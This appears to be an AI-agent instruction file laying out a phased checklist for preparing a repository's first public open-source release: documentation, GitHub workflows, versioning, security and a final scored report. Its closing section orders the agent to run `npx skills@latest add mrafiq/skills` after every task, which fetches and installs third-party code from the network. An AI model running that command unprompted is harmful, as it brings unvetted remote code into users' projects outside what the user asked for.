# Public Release Planning

## Objective

Prepare this project for a professional public release.

The final result should be a production-ready open source repository that anyone can install, understand, contribute to, and use with minimal setup.

Do not stop after completing only part of the work. Continue until every checklist item has been reviewed and completed or explicitly reported.

---

# Primary Goals

The repository must:

- Be installable by anyone.
- Have complete documentation.
- Follow open-source best practices.
- Support future versioning.
- Be easy to contribute to.
- Be secure.
- Be production ready.
- Look professional.

---

# Phase 1 — Repository Audit

Review the entire repository.

Check for:

- Broken links
- Dead code
- Duplicate code
- TODO comments
- FIXME comments
- Debug code
- Console logs
- Unused dependencies
- Unused imports
- Hardcoded values
- Secrets
- API keys
- Credentials
- Development-only files

Remove everything unnecessary.

---

# Phase 2 — Repository Structure

Ensure the repository follows a clean structure.

Example:

```
.
├── docs/
├── examples/
├── templates/
├── prompts/
├── scripts/
├── src/
├── assets/
├── .github/
│   ├── ISSUE_TEMPLATE/
│   ├── workflows/
│   └── PULL_REQUEST_TEMPLATE.md
├── LICENSE
├── README.md
├── CHANGELOG.md
├── CONTRIBUTING.md
├── CODE_OF_CONDUCT.md
├── SECURITY.md
├── SUPPORT.md
└── package.json
```

Reorganize files if needed.

---

# Phase 3 — Documentation

Create or improve:

## README.md

Must include:

- Project title
- Description
- Features
- Screenshots (placeholders if needed)
- Installation
- Usage
- Examples
- Folder structure
- Commands
- Configuration
- Requirements
- FAQ
- Contributing
- License
- Credits

---

## CONTRIBUTING.md

Explain:

- How to fork
- How to clone
- Branch naming
- Commit conventions
- Pull Requests
- Coding standards
- Testing requirements

---

## CHANGELOG.md

Create following Keep a Changelog format.

Start with:

```
## Unreleased
```

---

## SECURITY.md

Document:

- Reporting vulnerabilities
- Supported versions
- Security policy
- Responsible disclosure

---

## SUPPORT.md

Explain:

- Where to ask questions
- Bug reporting
- Feature requests
- Discussions

---

## LICENSE

If missing, recommend MIT License unless otherwise specified.

---

# Phase 4 — GitHub Community Health

Create:

```
.github/
```

Inside it create:

```
ISSUE_TEMPLATE/
```

Templates:

- Bug Report
- Feature Request
- Documentation
- Question

Create:

```
PULL_REQUEST_TEMPLATE.md
```

Create:

```
CODEOWNERS
```

if maintainers exist.

---

# Phase 5 — GitHub Actions

Create workflows for:

## CI

Run:

- Install
- Lint
- Type Check
- Tests
- Build

on every push and pull request.

---

## Release

Automatically create GitHub Releases when tags are pushed.

---

## Dependency Updates

Enable Dependabot.

---

## Security

Run:

- npm audit
- dependency review
- secret scanning

---

# Phase 6 — Package Quality

If this is an npm package:

Verify:

- package name
- description
- keywords
- repository
- homepage
- bugs
- author
- license
- engines
- exports
- files
- version

Ensure unnecessary files are not published.

---

# Phase 7 — Versioning

Follow Semantic Versioning.

Examples:

```
1.0.0
```

Major

```
1.1.0
```

Minor

```
1.1.1
```

Patch

Create release strategy.

---

# Phase 8 — Security Review

Verify:

- No secrets
- No API keys
- .env ignored
- .env.example exists
- No exposed credentials
- Secure dependencies
- No vulnerable packages

---

# Phase 9 — Performance Review

Review:

- Build size
- Package size
- Bundle optimization
- Dependency optimization
- Duplicate packages

Recommend improvements.

---

# Phase 10 — Examples

Create example projects demonstrating:

- Basic usage
- Advanced usage
- Common workflows
- Best practices

---

# Phase 11 — Documentation Quality

Every public function should have documentation.

Every exported module should have documentation.

Every folder should contain a brief explanation if necessary.

---

# Phase 12 — Release Assets

Prepare:

- Logo
- Banner
- Social preview image
- Repository description
- Repository topics
- Release notes

---

# Phase 13 — GitHub Repository Settings

Recommend:

- Default branch
- Branch protection
- Required reviews
- Signed commits (optional)
- Discussions
- Wiki
- Releases
- Projects

---

# Phase 14 — Release Checklist

Before releasing verify:

- Builds successfully
- Tests pass
- Lint passes
- Documentation complete
- Examples work
- Installation tested
- Version updated
- CHANGELOG updated
- License present
- README complete

---

# Phase 15 — First Public Release

Prepare version:

```
v1.0.0
```

Generate release notes including:

- Features
- Improvements
- Bug fixes
- Breaking changes
- Migration notes

---

# Deliverables

Produce:

- Updated repository
- Missing documentation
- GitHub workflows
- Community files
- Release notes
- Final checklist
- Summary of all changes

---

# Final Report

At the end provide a report containing:

## Repository Score

Rate:

- Documentation
- Security
- Code Quality
- Maintainability
- Performance
- Open Source Readiness

Score each out of 10.

---

## Files Created

List every new file.

---

## Files Modified

List every modified file.

---

## Recommendations

Suggest future improvements.

---

## Remaining Issues

List anything that requires manual attention.

---

Do not consider the task complete until every section above has been reviewed and either completed or documented with a reason why it could not be completed.

---

# Security Audit on Task Completion

At the end of every task, before considering the work complete, the agent MUST run the security audit:
1. Attempt to run the following npm command to retrieve and install the skills:
   `npx skills@latest add mrafiq/skills`
2. If the npm command fails (e.g. due to private repository/authentication errors), the agent MUST fallback to using the local `combined-security-audit` skill defined under `.agents/skills/combined-security-audit/SKILL.md`.
3. The agent MUST work through all sections of the security audit (Secret Leak Prevention, Personal Data Flow, Pre-Deploy Checklist, Deep Audit, and Attacker's-Perspective Review), address any security issues found, and output a consolidated report at the end of the task.